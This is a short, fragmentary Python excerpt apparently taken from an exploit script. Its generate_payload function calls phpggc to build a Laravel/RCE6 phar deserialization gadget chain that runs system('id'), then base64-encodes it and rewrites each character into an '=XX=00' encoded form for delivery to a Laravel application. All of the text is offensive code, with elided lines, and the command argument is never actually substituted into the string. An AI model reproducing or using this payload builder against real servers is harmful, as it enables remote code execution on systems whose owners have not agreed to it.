...
def generate_payload(command='', padding=0):
    if '/' in command:
        ...
        command = command.replace('\'', '\\\'')
    os.system(r'''php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system('id');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())'''%(command))
    payload = ''
